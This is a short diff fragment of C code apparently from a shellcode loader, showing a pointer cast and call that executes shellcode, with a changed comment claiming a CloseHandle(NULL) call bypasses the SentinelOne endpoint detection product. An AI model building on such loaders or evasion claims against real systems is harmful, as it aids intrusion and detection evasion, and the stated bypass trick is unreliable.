@@ -37,6 +37,6 @@ int main(int argc, char **argv) {
     ((void(*)())shellcode_pointer)();
 
     free(shellcode_pointer);
-    CloseHandle(NULL);  // bypass my EDR
+    CloseHandle(NULL);  // bypass SentinelOne
     return 0;
 }
